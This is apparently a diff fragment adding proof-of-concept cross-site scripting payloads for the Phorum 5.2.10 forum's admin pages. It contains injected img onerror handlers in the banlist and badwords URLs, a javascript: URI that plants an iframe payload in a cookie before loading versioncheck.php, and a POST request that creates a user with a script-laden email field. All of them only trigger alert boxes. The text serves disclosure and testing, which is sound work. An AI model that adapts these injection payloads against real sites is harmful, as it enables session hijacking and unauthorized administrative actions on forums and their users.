@@ -1,0 +1,22 @@
+http://www.example.com/phorum-5.2.10/admin.php?module=banlist&curr=1"><img/src/onerror="alert('voodoo');
+        &delete=1
+        ---
+
+        +++
+        http://www.example.com/phorum-5.2.10/admin.php?module=badwords&curr=1"><img/src/onerror="
+        alert('voodoo');&delete=1
+        ---
+
+        +++
+        javascript:with(document)cookie="phorum_upgrade_available=
+        <iframe/src='javascript:alert(/voodoo/.source)'>",
+        location="http://www.victim.com/phorum-5.2.10/versioncheck.php";
+        ---
+
+        +++
+        POST /www.example.com/admin.php HTTP/1.1
+
+        module=users&referrer=http%3A%2F%2Fwww.victim.com%2Fphorum-5.2.10%2Fadmin.php%3Fmodule%3Dusers
+        &addUser=1&username=xss&real_name=xss&
+        email=%3Ciframe%2Fsrc%3D%22javascript%3Aalert%28%27voodoo%27%29%3B%22%3E&password1=xss&password2=xss
+        &admin=0
